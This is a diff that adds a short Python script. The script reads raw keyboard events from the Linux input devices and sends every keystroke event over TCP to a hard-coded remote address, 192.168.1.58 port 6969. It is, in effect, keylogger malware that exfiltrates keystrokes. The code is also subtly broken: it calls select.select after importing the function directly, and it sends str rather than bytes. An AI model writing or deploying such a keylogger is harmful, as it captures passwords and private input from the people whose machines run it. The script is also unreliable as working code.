@@ -1,0 +1,26 @@
+#!/bin/python3
+
+import struct
+import socket
+import glob
+from select import select
+
+def read_loop(socket):
+    fds = [open(f, 'rb') for f in glob.glob("/dev/input/by-path/*kbd")]
+    struct_format = 'llHHI'
+    event_struct_size = struct.calcsize(struct_format)
+
+    while True:
+        readables, _, _ = select.select(fds, [], [], 0.5)
+        if not readables:
+            continue
+
+        events = [r.read(event_struct_size) for r in readables]
+        for ev in events:
+            (_, _, t, c, v) = struct.unpack(struct_format, ev)
+            socket.send(f'type:{t} -- code:{c} -- value:{v}')
+
+if __name__ == "__main__":
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("192.168.1.58", 6969))
+    read_loop(s)
